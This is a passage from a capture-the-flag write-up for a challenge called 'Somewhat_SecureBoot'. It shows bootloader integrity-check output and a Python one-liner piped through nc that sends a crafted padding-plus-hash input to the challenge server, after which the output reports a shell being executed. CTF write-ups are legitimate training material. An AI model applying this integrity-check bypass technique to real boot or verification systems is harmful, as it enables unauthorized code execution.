...
Attempting to load the bootloader /bootloaders/BL2.bin with hash [AWS_SECRET_REMOVED]ff0c8a702f8858e682a02281
...
Attempting to load the bootloader /bootloaders/BL3.bin with hash [AWS_SECRET_REMOVED]82b5d50b6d38b6d1452c3070
Bootloader integrity compromised... Expected receiving hash: [AWS_SECRET_REMOVED]aaaaaaaaaaaaaaaaaaaaaaaa
Exiting...
```
...
```console
root@kali:/media/sf_CTFs/matrix/Somewhat_SecureBoot# python3 -c "print ('b'*32 + '[AWS_SECRET_REMOVED]82b5d50b6d38b6d1452c3070')" | nc challenges.ctfd.io 30071
Bootloader number 1 - Up and running...
Checking environment...
Env is valid.
...
Executing shell: [AWS_SECRET_REMOVED][AWS_SECRET_REMOVED]6d38b6d1452c3070
